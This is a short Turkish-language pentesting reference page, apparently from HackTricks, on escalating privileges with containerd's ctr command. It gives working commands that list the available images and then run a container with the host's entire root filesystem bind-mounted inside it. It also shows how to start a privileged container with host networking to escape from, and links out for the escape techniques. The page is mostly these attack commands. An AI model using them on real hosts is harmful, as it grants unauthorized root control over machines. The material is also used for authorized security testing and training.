# Containerd (ctr) Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

**containerd** ve `ctr` hakkında bilgi almak için aşağıdaki bağlantıya gidin:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## YÜ 1

Eğer bir hostun `ctr` komutunu içerdiğini bulursanız:
```bash
which ctr
/usr/bin/ctr
```
Görüntüleri listeleyebilirsiniz:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Ve ardından **bu görüntülerden birini ana makine kök klasörünü ona monte ederek çalıştırın**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Bir konteyneri ayrıcalıklı olarak çalıştırın ve ondan kaçın.\
Ayrıcalıklı bir konteyneri şu şekilde çalıştırabilirsiniz:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Sonra, **ayrılmış yetenekleri kötüye kullanarak ondan kurtulmak için** aşağıdaki sayfada belirtilen bazı teknikleri kullanabilirsiniz:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
